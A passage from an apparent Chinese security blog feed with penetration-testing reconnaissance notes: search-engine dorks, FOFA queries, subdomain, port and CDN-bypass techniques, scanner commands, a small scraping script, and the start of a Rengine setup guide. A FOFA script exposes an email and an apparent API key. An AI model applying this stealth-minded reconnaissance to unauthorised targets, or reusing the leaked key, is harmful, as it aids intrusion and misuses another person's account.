        <content type="html"><![CDATA[<h1 id="1-信息收集-更新中"><a href="#1-信息收集-更新中" class="headerlink" title="1.信息收集(更新中)"></a>1.信息收集(更新中)</h1><h2 id="1-1信息收集概述"><a href="#1-1信息收集概述" class="headerlink" title="1.1信息收集概述"></a>1.1信息收集概述</h2><h3 id="1-1-1信息收集的基本要求"><a href="#1-1-1信息收集的基本要求" class="headerlink" title="1.1.1信息收集的基本要求"></a>1.1.1信息收集的基本要求</h3><p>1.全面:<br>对目标所有的业务和非业务存在点进行全面的信息收集。</p><p>2.准确:<br>对收集到的信息尤其是重要信息要再三确认其信息的准确性。</p><p>3.失效:<br>注意信息产生时间和手机时间,是否具有时间差,时间差能否接受。</p><p>4.清晰:<br>对于收集到的信息要做到逻辑清晰,能清楚分辨出各个收集到的信息之间的逻辑关系和资产之间的相对位置。</p><p>5.拓步:<br>以信息起点由点到面。</p><h3 id="1-1-2-信息搜集注意点"><a href="#1-1-2-信息搜集注意点" class="headerlink" title="1.1.2.信息搜集注意点"></a>1.1.2.信息搜集注意点</h3><p>信息搜集底层逻辑: 通过各种渠道对已公开或未公开的信息进行搜集,尽可能搜集薄弱点。</p><p>注意事项:<br>1.降低被发现度,提高隐蔽性。<br>2.细心，耐心。</p><h3 id="1-1-3收集目标"><a href="#1-1-3收集目标" class="headerlink" title="1.1.3收集目标"></a>1.1.3收集目标</h3><p>服务器ip<br>域名<br>操作系统<br>web容器 tomcat<br>端口<br>协议 http https<br>cdn 多地（国外）ping 查历史域名解析记录<a href="https://www.ip138.com/">https://www.ip138.com/</a> 主站 流量⼤ 有cdn ⼦域名的站 流量⼩，没有cdn https 证书 </p><p>⽤的什么语⾔ login.php index.jsp index.asp thinkphp<br>框架 tp cms<br>数据库 不是绝对： php——&gt;mysql 开发难度低 中⼩公司 mysql免费 jsp——&gt;oracle&#x2F;mysql oracle 收费⽽且很贵 流量⼤的⼤型公司 asp——&gt;sqlserver 微软⾃家的 （sqlserver堆叠注入+xpcmdshell）<br>负载均衡<br>waf<br>代码泄露:扫目录扫到备份文件<br>微信⼩程序<br>信任域名<br>界面上的js:看调用路径，有的不是调用的本地，调用的其他域名可能也是资产<br>接口</p><h3 id="1-1-4信息收集分类"><a href="#1-1-4信息收集分类" class="headerlink" title="1.1.4信息收集分类"></a>1.1.4信息收集分类</h3><p>信息搜集主要分为两类:<br>1.被动信息搜集<br>2.主动信息搜集</p><h2 id="1-2-信息收集流程"><a href="#1-2-信息收集流程" class="headerlink" title="1.2.信息收集流程"></a>1.2.信息收集流程</h2><h2 id="1-3-信息收集工具编写示例"><a href="#1-3-信息收集工具编写示例" class="headerlink" title="1.3.信息收集工具编写示例"></a>1.3.信息收集工具编写示例</h2><p>1.子域名爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#用户输入域名</span></span><br><span class="line">domain = <span class="built_in">input</span>(<span class="string">&quot;请输入域名:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">i = i*<span class="number">10</span></span><br><span class="line"><span class="comment">#代理头</span></span><br><span class="line">heads=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0(Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&#x27;https://cn.bing.com/search? q=site%3A&#x27;</span>+domain+<span class="string">&#x27;&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;pq=site%3Adgjy.net&amp;sc=2- 11&amp;sk=&amp;cvid=C1A7FC61462345B1A71F431E60467C43&amp;toHttps=1&amp;redig=3FEC4F2BE86247E8AE3BB965A6 2CD454&amp;pn=2&amp;first=&#123;&#125;&amp;FROM=PERE&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">html=requests.get(url,headers=heads)</span><br><span class="line">soup=BeautifulSoup(html.content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">job_bt = soup.findAll(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> job_bt:</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(i.a.get(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.fofa查询</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> fofa </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">email, key = (<span class="string">&#x27;904945036@qq.com&#x27;</span>,<span class="string">&#x27;b4b5d6d0c4afae6a9cb82939f03b10b4&#x27;</span>) </span><br><span class="line"><span class="comment">#输⼊email和key </span></span><br><span class="line">client = fofa.Client(email, key) </span><br><span class="line"><span class="comment">#将email和key传⼊fofa.Client类进⾏初始化和验证，并得到⼀个fofa client对象 </span></span><br><span class="line">query_str = raw_input(<span class="string">&#x27;请输⼊条件&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(query_str) </span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>): </span><br><span class="line"><span class="comment">#从第1⻚查到第50⻚ </span></span><br><span class="line">data = client.get_data(query_str,page=page,fields=<span class="string">&quot;ip,port&quot;</span>) </span><br><span class="line"><span class="comment">#查询第page⻚数据的ip和端⼝ </span></span><br><span class="line"><span class="keyword">for</span> ip,port <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>]: </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%s,%s&quot;</span>%(ip,port) </span><br><span class="line"><span class="comment">#打印出每条数据的ip和端⼝```</span></span><br></pre></td></tr></table></figure><h1 id="2-被动信息收集"><a href="#2-被动信息收集" class="headerlink" title="2.被动信息收集"></a>2.被动信息收集</h1><h3 id="2-1基本流程"><a href="#2-1基本流程" class="headerlink" title="2.1基本流程"></a>2.1基本流程</h3><ol><li>第三⽅的信息收集机构或平台已经收集到⽬标的信息 </li><li>第三⽅的信息收集机构或平台将信息存储在某处 </li><li>攻击者从存储信息的地⽅查询信息 </li><li>攻击者得到相应信息</li></ol><h3 id="2-2被动信息收集优缺点"><a href="#2-2被动信息收集优缺点" class="headerlink" title="2.2被动信息收集优缺点"></a>2.2被动信息收集优缺点</h3><p>1.优点:<br>    1.隐蔽性高,不容易被发现<br>    2.收集的信息量和覆盖面比较大<br>2.缺点<br>    1.收集到的信息准确性与时效性不高<br>    2.无法收集到敏感或未公开信息</p><p>应用场景:通过被动信息收集获取目标基本要素，根据信息要素判断目标特点与薄弱点</p><h3 id="2-3-常见手段"><a href="#2-3-常见手段" class="headerlink" title="2.3 常见手段"></a>2.3 常见手段</h3><h4 id="1-Google语法"><a href="#1-Google语法" class="headerlink" title="1.Google语法"></a>1.Google语法</h4><p><a href="https://www.google.com/">https://www.google.com</a><br>常用google语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: 指定站点的内容(域名)</span><br><span class="line">例如site:edu.cn site:qq.com</span><br><span class="line"></span><br><span class="line">filetype:搜索指定的文件类型(log,txt,rar,bak,pdf,xls,dat) </span><br><span class="line">例如 filetype:pdf</span><br><span class="line"></span><br><span class="line">inurl: 搜索url中有指定内容的网页 </span><br><span class="line">例如 url:uploads 文件上传</span><br><span class="line"></span><br><span class="line">intitle: 网页标题中含有关键字</span><br><span class="line">例如 intitle:泛微</span><br><span class="line"></span><br><span class="line">intext:网页中正文含有关键字</span><br><span class="line">例如 intext:用户名/密码/登录</span><br><span class="line"></span><br><span class="line">cache:</span><br><span class="line">已经删除的缓存网页，可能有信息 </span><br></pre></td></tr></table></figure><p>Google语法查询对应漏洞database<br><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><h4 id="2-网络空间搜索引擎语法及基本使用"><a href="#2-网络空间搜索引擎语法及基本使用" class="headerlink" title="2.网络空间搜索引擎语法及基本使用"></a>2.网络空间搜索引擎语法及基本使用</h4><p>常用推荐</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fofa:      https://fofa.info/</span><br><span class="line">鹰图:      https://hunter.qianxin.com/</span><br><span class="line">zoomeye:   https://www.zoomeye.org/</span><br><span class="line">360 quake  https://quake.360.net/quake/#/index</span><br><span class="line"></span><br><span class="line">censys:    https://search.censys.io/</span><br><span class="line">shodan:    https://www.shodan.io/</span><br><span class="line">onyphe:    https://www.onyphe.io/</span><br></pre></td></tr></table></figure><p>fofa为例<br>fofa常用:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;abc&quot;    标题中存在abc的站点</span><br><span class="line">header=&quot;abc&quot;   http头中存在abc的站点</span><br><span class="line">body=&quot;abc&quot;     html正文中存在abc的站点</span><br><span class="line">domain=&quot;qq.com&quot;搜索根域名带有qq.com的站点</span><br><span class="line">host=&quot;login&quot;   从url中搜索域名带有logih的站点</span><br><span class="line">port=&quot;443&quot;     查找对应443端口的资产</span><br><span class="line">ip=&quot;1.1.1.1&quot;   从ip搜索包含1.1.1.1的网站,搜索要用ip作为名称</span><br><span class="line">protocol=&quot;https&quot; 搜索指定协议类型</span><br><span class="line">city=&quot;Hangzhou&quot;  搜索指定城市的资产</span><br><span class="line">region=&quot;Zhejiang&quot;搜索行政区的资产</span><br><span class="line">country=&quot;CN&quot;    搜索指定国家(编码的资产)</span><br><span class="line">cert=&quot;baidu&quot;    搜索证书中包含baidu的资产</span><br><span class="line">ip_country=&quot;Hangzhou&quot; 搜索指定城市ip的资产</span><br></pre></td></tr></table></figure><p>高级搜索</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 () &amp;&amp; || !=</span><br></pre></td></tr></table></figure><p>推荐使用工具 fofa_view<br>项目地址:<a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>配置相关信息后即可使用<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307192108553.png"></p><h4 id="3-企业信息收集"><a href="#3-企业信息收集" class="headerlink" title="3.企业信息收集"></a>3.企业信息收集</h4><p>国内:<br>天眼查<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>爱企查<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a><br>小蓝本<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a><br>企查查<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>启信宝<a href="https://www.qixin.com/">https://www.qixin.com/</a></p><p>国外<br>OpenCorporates<a href="https://opencorporates.com/">https://opencorporates.com/</a><br>Wayback Machine<a href="http://web.archive.org/">http://web.archive.org/</a></p><p>零零信安:<a href="https://0.zone/">https://0.zone/</a></p><h1 id="3-主动信息收集"><a href="#3-主动信息收集" class="headerlink" title="3.主动信息收集"></a>3.主动信息收集</h1><h2 id="3-1-主动信息收集的基本结构"><a href="#3-1-主动信息收集的基本结构" class="headerlink" title="3.1.主动信息收集的基本结构"></a>3.1.主动信息收集的基本结构</h2><p>基本流程： </p><ol><li>由攻击者主动发起⾏为或请求 </li><li>⽬标受到⾏为或请求影响并发出反馈 </li><li>攻击者获得反馈并判断特征</li></ol><h2 id="3-2-主动信息收集的特点"><a href="#3-2-主动信息收集的特点" class="headerlink" title="3.2.主动信息收集的特点"></a>3.2.主动信息收集的特点</h2><p>主动信息收集的优缺点：<br>    优点：<br>        1.信息的针对性强<br>        2.信息的准确度和时效性⾼<br>        3.能收集到未公开的敏感信息(robots.txt,.rar)<br>    缺点：<br>        1.容易暴露，被发现的⻛险⾼(请求敏感内容,短时间同一ip访问次数大于某个值)<br>        2.收集的信息量和覆盖⾯⽐较少 </p><p>主动信息收集的应⽤场景:<br>主动信息通常在被动信息收集后分析出重要攻击面或敏感点再去针对性去做主动信息收集，在主动信息收集的时候通常持续时间比较长，而且会通过各种不同的方式与目标交互，实战中最常用的手段是模拟或伪装在正常业务流程与目标交互。</p><h2 id="3-3-主动信息收集手段"><a href="#3-3-主动信息收集手段" class="headerlink" title="3.3.主动信息收集手段"></a>3.3.主动信息收集手段</h2><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>1.搜索引擎</p><table border="1" width=100%><tr><th>Google</th><th><a href="https://www.google.com">www.google.com</a></th></tr><tr><th>Bing</th><th><a href="https://www.Bing.com">www.Bing.com</a></th></tr><tr><th>Baidu</th><th><a href="https://www.baidu.com">www.baidu.com</a></th></tr></table><p>2.网站备案</p><table border="2" width=100%><tr><th>ICP备案-站长之家</th><th><a href=http://icp.chinaz.com>http://icp.chinaz.com/</a></th></tr><tr><th>ICP/IP/域名备案管理</th><th><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></th></tr><tr><th>ICP备案信息查询</th><th><a href="https://www.icplist.com/">https://www.icplist.com/</a></th></tr></table><p>3.ip反查</p><table border=1 width=100%><tr><th>微步在线</th><th><a href="https://x.threatbook.cn">https://x.threatbook.cn</a></th></tr><tr><th>Ip138反查</th><th><a href="https://site.ip138.com">https://site.ip138.com</a></th></tr><tr><th>爱站网</th><th><a href="https://dns.aizhan.com">https://dns.aizhan.com</a></th></tr><tr><th>站长之家</th><th><a href="https://stool.chinaz.com/same">https://stool.chinaz.com/same</a></th></tr><tr><th>RapidDNS Sameip</th><th><a href="https://rapiddns.io/sameip">https://rapiddns.io/sameip</a></th></tr></table><p>4.AppinfoScanner<br>项目地址: <a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">支持对andriod,ios,web文件进行扫描</span><br><span class="line">可设置并发线程\设置过滤</span><br></pre></td></tr></table></figure><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>1.oneforall<br>config目录下有api.py用于配置api,配置的越全,搜集到的信息越全<br>项目仓库:<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据文档安装</span><br><span class="line">高版本中from re import sre_parse报错,只需将该语句更改为import sre_parse</span><br><span class="line">python oneforall.py --help 验证安装成功</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target example.com run</span><br><span class="line">python oneforall.py --targets ./domain.txt run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191747141.png"><br>扫描出的结果会放在results目录下的csv文件中<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191749379.png"></p><p>2.layer子域名挖掘机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双击layer.exe运行</span><br><span class="line">目录下的dic.txt为子域名爆破字典</span><br><span class="line">完成相关设定后开始扫描</span><br><span class="line">右键导出域名可导出域名(.txt)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191801910.png"></p><p>3.jsfind<br>爬取指定目标中的链接等内容,从而进一步爬取子域名和URL信息<br>项目地址:<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单爬取</span><br><span class="line">python JSFinder.py -u [target]</span><br><span class="line">深度爬取</span><br><span class="line">python JSFinder.py -u [target] -d</span><br><span class="line">批量爬取</span><br><span class="line">pyrhon JSfinder.py -f text.txt</span><br><span class="line">-c 指定cookie </span><br><span class="line">-ou 指定文件名保存url链接</span><br><span class="line">-os 指定文件名保存子域名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191820947.png"></p><p>4.subDomainsBrute<br>项目地址:<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>结果是子域名和对应ip<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191858788.png"></p><p>5.google语法<br>site:”baidu.com”<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191904557.png"></p><p>6.ksubdomain<br>Go编写,速度快<br>项目地址:<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307192013308.png"></p><p>7.fofa查询<br>domain&#x3D;”baidu.com”<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191940375.png"></p><p>8.威胁情报网站<br>例如:微步在线-子域名选项<br><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307192007620.png"></p><p>站长之家:<a href="https://tool.chinaz.com/subdomain/">https://tool.chinaz.com/subdomain/</a></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>1.masscan<br>项目地址:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单端口:masscan [ip] -p80</span><br><span class="line">多端口:masscan [ip] -p80,443</span><br><span class="line">范围端口:masscan [ip] -p20-1000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201648167.png"></p><p>2.nmap<br>官网地址:<a href="https://nmap.org/">https://nmap.org/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认端口扫描:nmap [ip]</span><br><span class="line">指定端口扫描:</span><br><span class="line">nmap [ip] -p 80</span><br><span class="line">nmap [ip] -p 80,3389</span><br><span class="line">nmap [ip] -p 20-1000</span><br><span class="line"></span><br><span class="line">TCP全连接扫描:</span><br><span class="line">nmap [ip] -p 80 -sT</span><br><span class="line"></span><br><span class="line">SYN半连接扫描:</span><br><span class="line">nmap [ip] -p 80 -sS</span><br><span class="line"></span><br><span class="line">网段主机探测</span><br><span class="line">nmap -sP 192.168.31.0/24</span><br><span class="line"></span><br><span class="line">服务识别</span><br><span class="line">nmap [ip] -p 80 -sV</span><br><span class="line"></span><br><span class="line">操作系统扫描</span><br><span class="line">nmap [ip] -O</span><br><span class="line"></span><br><span class="line">结果导出</span><br><span class="line">nmap [ip] -p 80 -oN result.txt</span><br><span class="line">nmap [ip] -p 80 -oX result.xml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201657588.png"></p><p>3.goby<br>官网地址:<a href="https://gobies.org/">https://gobies.org/</a><br>完成相关设定后直接扫<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201808355.png"></p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>1.Wappalyzer<br>谷歌应用商店链接:<a href="https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN">https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201953762.png"></p><p>2.Ehole</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可查指纹,可查C段权重</span><br><span class="line">EHole [command] --help查看用法</span><br><span class="line">例如 Ehole finger -u [ip]</span><br><span class="line">扫完会列出重点资产</span><br></pre></td></tr></table></figure><p>项目地址:<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p>3.Goby<br>下载地址:<a href="https://gobies.org/">https://gobies.org/</a></p><p>4.whatweb</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以搜集网站的一些文字信息</span><br></pre></td></tr></table></figure><p>项目地址:<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307202043710.png"></p><p>5.潮汐指纹<br><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p><h3 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h3><p>1.Ehole<br>项目地址:<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扫描后自动列出重点资产</span><br><span class="line">Ehole finger -u [ip]</span><br></pre></td></tr></table></figure><p>2.Eeyes<br>项目地址:<a href="https://github.com/EdgeSecurityTeam/Eeyes">https://github.com/EdgeSecurityTeam/Eeyes</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">筛选真实IP并整理C段</span><br><span class="line">Eeyes -f [目标]</span><br></pre></td></tr></table></figure><p>3.fscan<br>项目地址:<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网综合扫描工具，方便一键自动化、全方位漏扫扫描</span><br><span class="line">fscan.exe -h 192.168.1.1/24</span><br></pre></td></tr></table></figure><p>4.ServerScan<br>项目地址:<a href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用Golang开发且适用于攻防演习内网横向信息收集的高并发网络扫描、服务探测工具</span><br></pre></td></tr></table></figure><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p>CDN<br>通过不同地理位置的缓存来加快访问速度，所以我们有可能访问的⽹⻚不是真实ip提供的⽹⻚<br>挂了CDN的服务器解析到的是cdnip并不是真实的目标ip</p><p>1.CDN价格昂贵,<br>旁站，子域名，c段可能没有CDN</p><p>2.DNS历史解析<br>CDN基于解析,所以查看较早的CDN解析记录解析到真正主机<br>查询网站<br><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a><br><a href="https://webiplookup.com/">https://webiplookup.com</a><br><a href="https://viewdns.info/iphistory">https://viewdns.info/iphistory</a><br><a href="https://toolbar.netcraft.com/site_report">https://toolbar.netcraft.com/site_report</a></p><p>3.多地ping&#x2F;国外ping<br>可能国内采用cdn<br><a href="https://aizhan.com/">https://ping.aizhan.com</a><br><a href="https://ping.chinaz.com/">https://ping.chinaz.com</a></p><p>4.证书查询<br>域名的证书可能存在真实ip信息,如果目标站点配有https证书,我们可以查到所有相同证书的站点<br><a href="https://search.censys.io/">https://search.censys.io</a><br><a href="https://crt.sh/">https://crt.sh</a></p><p>5.邮箱服务器<br>cdn不支持邮箱<br>邮件查看注册原文(信头),里面的邮箱服务器ip可能是真实ip<br>实战中让目标邮箱服务器向自己的伪造邮箱发送邮件,查看邮箱服务器ip</p><p>6.边缘业务的子域名<br>例如app,小程序子域名指向的ip</p><p>7.fofa查找网站标题查找<br>title&#x3D;“”<br>得到站点ip,判断ip是否为主站</p><p>8.ajax应用架构<br>应用架构:<br>前后端不分离，bp返回包为html源码<br>前后端分离，返回包一般直接返回数据，通常是json数据</p><p>ajax请求不规范，以ip的形式进行调用<br>前端ajax去调用后台的api，他会访问后台的ip，此ip大概率为真实ip</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>1.dirsearch<br>项目地址:<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307202057179.png"></p><p>2.御剑扫描</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>1.xray<br>项目地址:<a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a><br>xray文档:<a href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p><p>2.nuclei<br>项目地址:<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br>nuclei文档:<a href="https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei">https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei</a></p><p>3.Goby<br>官网地址:<a href="https://gobies.org/">https://gobies.org/</a></p><h3 id="其他搜集"><a href="#其他搜集" class="headerlink" title="其他搜集"></a>其他搜集</h3><p>搜集员工信息,招标信息,github,百度贴吧,新浪微博,手机号,支付宝,论坛,博客,邮箱等</p><p>1.邮箱收集:EmailAll<br>项目地址:<a href="https://github.com/Taonn/EmailAll">https://github.com/Taonn/EmailAll</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api.py里配置信息</span><br><span class="line">settings.py里配置代理</span><br><span class="line">实例:</span><br><span class="line">    python3 emailall.py check</span><br><span class="line">    python3 emailall.py --domain example.com run</span><br><span class="line">    python3 emailall.py --domains ./domains.txt run</span><br></pre></td></tr></table></figure><p>2.公众号&#x2F;文章搜集:<br><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></p><p>3.网盘资源搜集</p><p>凌风云:<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com</a></p><p>大力盘:<a href="https://www.dalipan.com/">https://www.dalipan.com/</a></p><h3 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h3><p>ProxyPool<br>项目地址:<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p><h2 id="3-4-全方位收集"><a href="#3-4-全方位收集" class="headerlink" title="3.4.全方位收集"></a>3.4.全方位收集</h2><p>1.灯塔<br>项目地址:<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>2.水泽<br>项目地址: <a href="https://github.com/0x727/ShuiZe_0x727/">https://github.com/0x727/ShuiZe_0x727/</a></p><p>3.Goby<br>官网地址:<a href="https://gobies.org/">https://gobies.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动化网络侦察框架-Rengine 部署与使用</title>
      <link href="/2023/07/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E6%A1%86%E6%9E%B6-Rengine%20%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E6%A1%86%E6%9E%B6-Rengine%20%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="自动化网络侦察框架-Rengine-部署与使用"><a href="#自动化网络侦察框架-Rengine-部署与使用" class="headerlink" title="自动化网络侦察框架-Rengine 部署与使用"></a>自动化网络侦察框架-Rengine 部署与使用</h1><h1 id="1-部署"><a href="#1-部署" class="headerlink" title="1.部署"></a>1.部署</h1><h2 id="1-1-kali环境"><a href="#1-1-kali环境" class="headerlink" title="1.1.kali环境"></a>1.1.kali环境</h2><p>镜像环境:kali-linux-2023.2a-installer-amd64.iso<br>部署在vultr上</p><h2 id="1-2-安装软件"><a href="#1-2-安装软件" class="headerlink" title="1.2.安装软件"></a>1.2.安装软件</h2><p>1.安装git</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-git install git</span><br><span class="line">git -v 检查安装</span><br></pre></td></tr></table></figure><p>2.make</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali自带</span><br><span class="line">make -v 查看版本</span><br></pre></td></tr></table></figure><p>3.安装docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker.io</span><br><span class="line">docker -v 检查安装</span><br></pre></td></tr></table></figure><p>4.安装docker-compose</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-compose</span><br><span class="line">docker-compose 检查安装</span><br></pre></td></tr></table></figure><h2 id="1-3-部署rengine"><a href="#1-3-部署rengine" class="headerlink" title="1.3.部署rengine"></a>1.3.部署rengine</h2><p>1.项目源码克隆至本地</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/yogeshojha/rengine.git</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307150052727.png"><br>进入rengine文件夹中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd rengine</span><br></pre></td></tr></table></figure><p>2.编辑.env,更改POSTGRES_PASSWORD密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim .env</span><br></pre></td></tr></table></figure><p>3.运行安装脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p>直到出现如下页面,创建用户<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151109950.png"><br>这里因截图ctrl+c退出了，则使用make username创建用户<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151113402.png"></p><p>4.启动</p><figure class="highlight 